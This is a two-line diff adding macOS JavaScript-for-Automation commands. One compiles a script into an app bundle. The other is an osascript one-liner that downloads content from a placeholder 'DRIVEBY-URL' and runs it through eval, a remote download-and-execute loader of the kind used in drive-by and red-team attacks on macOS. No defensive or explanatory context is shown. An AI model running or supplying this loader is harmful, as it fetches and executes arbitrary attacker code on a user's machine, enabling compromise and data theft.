@@ -1,0 +1,2 @@
+osacompile -l JavaScript -o app.app -s app.js
+osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('DRIVEBY-URL')),$.NSUTF8StringEncoding)));"
